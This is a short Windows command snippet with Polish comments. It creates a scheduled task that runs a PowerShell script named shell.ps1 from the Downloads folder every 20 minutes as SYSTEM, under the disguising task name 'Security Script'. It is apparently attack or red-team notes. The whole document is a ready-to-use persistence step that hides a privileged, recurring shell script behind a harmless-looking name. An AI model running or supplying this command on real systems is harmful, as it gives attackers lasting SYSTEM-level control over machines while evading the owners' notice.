# dodanie do harmonogramu zadań 
# na co 20 minut wykonywać wskazany skrypt
schtasks /create /sc minute /mo 20 /tn "Security Script" /tr "powershell -File c:\users\user\Downloads\shell.ps1" /ru System
